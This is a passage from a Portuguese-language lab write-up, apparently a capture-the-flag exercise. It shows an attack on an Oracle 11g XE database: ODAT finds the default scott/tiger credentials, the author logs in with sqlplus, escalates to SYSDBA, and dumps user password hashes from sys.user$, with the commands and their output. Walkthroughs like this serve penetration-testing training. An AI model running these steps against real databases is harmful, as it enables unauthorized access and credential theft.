+<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>[+] Service Name(s) found on the 10.129.97.235:1521 server: XE,XEXDB
+</code></pre></div>
+<p><strong>Informações coletadas:</strong>
+- SID válido: XE
+- Service Names: XE, XEXDB</p>
+<h3 id="3-enumeracao-odat-credentials">3. Enumeração ODAT - Credentials</h3>
+<p>Continuando com o ODAT para verificar credenciais padrão.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>./odat.py all -s 10.129.97.235
+</code></pre></div>
+<p><strong>Retorno:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>[4] (10.129.97.235:1521): Searching valid accounts on the XE SID
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>[!] Notice: &#39;ctxsys&#39; account is locked, so skipping this username for password
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>[!] Notice: &#39;dbsnmp&#39; account is locked, so skipping this username for password
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>...
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>[+] Valid credentials found: scott/tiger. Continue...
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>...
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>[+] Accounts found on 10.129.97.235:1521/sid:XE: 
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>scott/tiger
+</code></pre></div>
+<p><strong>Informações coletadas:</strong>
+- Credenciais encontradas: scott/tiger</p>
+<h3 id="4-conexao-sqlplus">4. Conexão SQLPlus</h3>
+<p>Encontrei as credenciais scott/tiger. Agora vou me conectar via sqlplus a base de dados com a credencial que encontrei anteriormente.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sqlplus scott/tiger@10.129.97.235/XE
+</code></pre></div>
+<p><strong>Retorno:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>SQL*Plus: Release 19.0.0.0.0 - Production on Tue May 19 14:06:55 2026
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Version 19.6.0.0.0
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>Copyright (c) 1982, 2019, Oracle.  All rights reserved.
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>ERROR:
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>ORA-28002: the password will expire within 7 days
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>Connected to:
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+</code></pre></div>
+<p><strong>Informações coletadas:</strong>
+- Conexão estabelecida com o banco Oracle 11g XE</p>
+<h3 id="5-enumeracao-de-tabelas">5. Enumeração de Tabelas</h3>
+<p>Procurando por tabelas disponíveis.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>select table_name from all_tables;
+</code></pre></div>
+<p><strong>Retorno:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>TABLE_NAME
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>------------------------------
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>DUAL
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>SYSTEM_PRIVILEGE_MAP
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>TABLE_PRIVILEGE_MAP
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>...
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>DEPT
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>EMP
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>BONUS
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>SALGRADE
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>...
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>75 rows selected.
+</code></pre></div>
+<h3 id="6-verificacao-de-permissoes">6. Verificação de Permissões</h3>
+<p>Verificando quais permissões o usuário scott tem.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>select * from user_role_privs;
+</code></pre></div>
+<p><strong>Retorno:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>USERNAME               GRANTED_ROLE           ADM DEF OS_
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>------------------------------ ------------------------------ --- --- ---
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>SCOTT                  CONNECT                NO  YES NO
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>SCOTT                  RESOURCE               NO  YES NO
+</code></pre></div>
+<h3 id="7-conexao-como-sysdba">7. Conexão como SYSDBA</h3>
+<p>Como não encontrei nada, vou tentar me conectar ao banco com as mesmas credenciais mas tentando me conectar como sysdba.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sqlplus scott/tiger@10.129.97.235/XE as sysdba
+</code></pre></div>
+<p><strong>Retorno:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>SQL*Plus: Release 19.0.0.0.0 - Production on Tue May 19 14:08:51 2026
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Version 19.6.0.0.0
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>Connected to:
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+</code></pre></div>
+<h3 id="8-enumeracao-de-hashes-de-senha">8. Enumeração de Hashes de Senha</h3>
+<p>Buscando por nome e senha dos usuários.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>select name,password from sys.user$;
+</code></pre></div>
+<p><strong>Retorno:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>NAME                   PASSWORD
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>------------------------------ ------------------------------
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>SYS                FBA343E7D6C8BC9D
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>...
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>SYSTEM                 B5073FE1DE351687
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>...
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>DBSNMP                 E066D214D5421CCC
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>...
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>CTXSYS                 D1D21CA56994CAB6
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>...
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>XDB                E76A6BD999EF9FF1
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>...
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>SCOTT                  F894844C34402B67
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>51 rows selected.
+</code></pre></div>
+<p><strong>Informações coletadas:</strong>
+- Hash de senha do usuário DBSNMP encontrado: E066D214D5421CCC
+- Diversos usuários do sistema com hashes</p>
+<hr />
+<h2 id="resumo">Resumo</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Versão</strong></td>
+<td style="text-align: left;">Oracle TNS listener 11.2.0.2.0</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Porta</strong></td>
+<td style="text-align: left;">1521/TCP</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>SID válido</strong></td>
+<td style="text-align: left;">XE</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Service Names</strong></td>
+<td style="text-align: left;">XE, XEXDB</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Credenciais</strong></td>
+<td style="text-align: left;">scott/tiger</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Usuários enumerados</strong></td>
+<td style="text-align: left;">SYS, SYSTEM, DBSNMP, CTXSYS, XDB, SCOTT</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>CVE</strong></td>
+<td style="text-align: left;">CVE-2012-1675 (TNS poisoning)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Ferramentas</strong></td>
+<td style="text-align: left;">nmap, ODAT, sqlplus</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="referencias">Referências</h2>
+<ul>
+<li><a href="https://github.com/0xdea/exploits/tree/master/systems/oracle">ODAT - Oracle Database Attacking Tool</a></li>
+<li><a href="https://docs.oracle.com/database/121/NETRF/title.htm">Oracle TNS Listener Documentation</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1675">CVE-2012-1675</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
